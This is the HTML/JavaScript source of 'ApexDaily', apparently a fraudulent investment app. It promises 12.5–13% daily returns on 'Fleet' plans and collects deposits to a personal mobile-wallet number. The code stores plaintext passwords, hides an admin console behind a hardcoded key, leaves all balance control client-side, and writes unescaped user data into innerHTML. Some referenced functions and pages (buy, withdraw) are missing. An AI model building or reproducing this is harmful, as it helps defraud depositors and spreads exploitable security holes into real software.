<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ApexDaily | Anonymous Trading</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        
        /* Sweet & Vibrant Styles */
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .neon-card { background: linear-gradient(135deg, #0ea5e9, #a855f7, #ec4899); box-shadow: 0 20px 50px rgba(168, 85, 247, 0.3); }
        .btn-gradient { background: linear-gradient(90deg, #ff0080, #7928ca); transition: 0.3s; }
        .btn-gradient:active { transform: scale(0.92); }
        
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 bg-clip-text text-transparent bg-gradient-to-r from-pink-500 to-violet-500">APEXDAILY</h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.5em] mb-12 font-bold">Anonymous Access Only</p>
            
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-pink-500 shadow-2xl space-y-4">
                <input type="text" id="user-id" placeholder="Username" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold focus:border-pink-500">
                <input type="password" id="user-pass" placeholder="Password" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold focus:border-pink-500">
                <button onclick="anonymousLogin()" class="w-full btn-gradient py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest mt-4 shadow-xl">Enter Vault</button>
            </div>
            <p class="mt-8 text-[7px] text-gray-700 uppercase font-bold tracking-widest">Powered by Apex Encryption</p>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-6 flex justify-between items-center sticky top-0 bg-[#010409]/90 backdrop-blur-lg z-50">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 rounded-2xl neon-card flex items-center justify-center font-black">A</div>
                <h2 class="text-sm font-black tracking-tight uppercase">@<span id="display-name">User</span></h2>
            </div>
            <button onclick="logout()" class="w-10 h-10 glass rounded-xl flex items-center justify-center text-red-500"><i class="fa-solid fa-power-off"></i></button>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="neon-card p-10 rounded-[3rem] mb-8 text-center">
                <p class="text-[9px] text-white/70 font-black uppercase tracking-widest mb-1">Total Assets</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-center gap-4">
                    <button onclick="changePage('wallet')" class="bg-white/20 px-6 py-2 rounded-full text-[9px] font-black uppercase border border-white/20">Recharge</button>
                    <button onclick="changePage('withdraw')" class="bg-black/20 px-6 py-2 rounded-full text-[9px] font-black uppercase border border-white/10">Payout</button>
                </div>
            </div>

            <div id="plans-grid" class="space-y-4">
                <div onclick="buy(200, 12.5, 'Micro-Fleet')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center border-l-4 border-pink-500">
                    <div><h4 class="font-black text-[10px] uppercase">Micro-Fleet</h4><p class="text-[8px] text-green-400">Rs. 25 Daily</p></div>
                    <span class="font-black text-sm">₨ 200</span>
                </div>
                <div onclick="buy(500, 13, 'Pro-Fleet')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center border-l-4 border-violet-500">
                    <div><h4 class="font-black text-[10px] uppercase">Pro-Fleet</h4><p class="text-[8px] text-green-400">Rs. 65 Daily</p></div>
                    <span class="font-black text-sm">₨ 500</span>
                </div>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-pink-500 text-center">
                <h3 class="font-black text-pink-400 mb-6 uppercase text-xs italic">Fund Deposit</h3>
                <div class="bg-white/5 p-4 rounded-2xl mb-6 flex justify-between text-[10px] font-bold"><span>JazzCash / SadaPay</span><span class="text-pink-400">03705519562</span></div>
                <input type="number" id="dep-amt" placeholder="Enter Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center text-xs border border-white/5">
                <input type="text" id="dep-tid" placeholder="TID Code" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center text-xs border border-white/5">
                <button onclick="submitDep()" class="w-full btn-gradient py-4 rounded-2xl font-black text-[10px] uppercase">Submit Proof</button>
            </div>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3rem]">
        <button onclick="changePage('home')" class="text-pink-500 flex flex-col items-center gap-1"><i class="fa-solid fa-house text-lg"></i><span class="text-[7px] font-black uppercase">Home</span></button>
        <button onclick="changePage('wallet')" class="text-gray-500 flex flex-col items-center gap-1"><i class="fa-solid fa-wallet text-lg"></i><span class="text-[7px] font-black uppercase">Wallet</span></button>
        <button onclick="alert('Support: WhatsApp 03XX...')" class="text-gray-500 flex flex-col items-center gap-1"><i class="fa-solid fa-headset text-lg"></i><span class="text-[7px] font-black uppercase">Help</span></button>
    </nav>

    <div id="admin-ui" class="fixed inset-0 bg-black z-[5000] p-8 hidden overflow-y-auto">
        <h2 class="text-pink-500 font-black italic mb-8 uppercase">Master Console</h2>
        <div id="adm-list" class="space-y-3"></div>
        <button onclick="this.parentElement.classList.add('hidden')" class="mt-8 text-gray-600 text-[10px] font-bold uppercase">Exit Console</button>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let currentUser = null; let taps = 0;

        async function anonymousLogin() {
            const user = document.getElementById('user-id').value.trim();
            const pass = document.getElementById('user-pass').value;
            if(!user || !pass) return alert("Enter Username & Password sweetie!");
            
            const ref = db.collection("users").doc(user);
            const doc = await ref.get();
            
            if(doc.exists) {
                if(doc.data().password !== pass) return alert("Wrong Password!");
            } else {
                await ref.set({ name: user, password: pass, balance: 0, profit: 0, time: Date.now(), tierName: "Inactive" });
            }
            
            localStorage.setItem('apex_user', user);
            launchApp(user);
        }

        function launchApp(name) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-name').innerText = name;
            
            db.collection("users").doc(name).onSnapshot(d => {
                if(d.exists()) {
                    currentUser = d.data();
                    document.getElementById('v-bal').innerText = "₨ " + (currentUser.balance || 0).toLocaleString();
                }
            });
        }

        function changePage(p) {
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
        }

        async function submitDep() {
            const a = document.getElementById('dep-amt').value;
            const t = document.getElementById('dep-tid').value;
            await db.collection("requests").add({ user: currentUser.name, amount: parseInt(a), tid: t, type: "deposit", status: "pending", time: Date.now() });
            alert("Request sent sweetie! 😘");
            changePage('home');
        }

        function adminTap() {
            taps++;
            if(taps >= 3) {
                if(prompt("Secret Key:") === "apex786") {
                    document.getElementById('admin-ui').classList.remove('hidden');
                    syncAdmin();
                }
                taps = 0;
            }
        }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const l = document.getElementById('adm-list'); l.innerHTML = '';
                snap.forEach(doc => {
                    const d = doc.data();
                    l.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[10px] font-black uppercase"><div>${d.user}<br>Rs ${d.amount}</div><button onclick="approve('${doc.id}','${d.user}',${d.amount})" class="bg-pink-600 px-4 py-2 rounded-xl">Approve</button></div>`;
                });
            });
        }

        async function approve(id, u, amt) {
            const ref = db.collection("users").doc(u);
            const d = await ref.get();
            await ref.update({ balance: (d.data().balance || 0) + amt });
            await db.collection("requests").doc(id).update({ status: "approved" });
            alert("Approved! 💖");
        }

        function logout() { localStorage.removeItem('apex_user'); location.reload(); }
        window.onload = () => { const s = localStorage.getItem('apex_user'); if(s) launchApp(s); };
    </script>
</body>
</html>
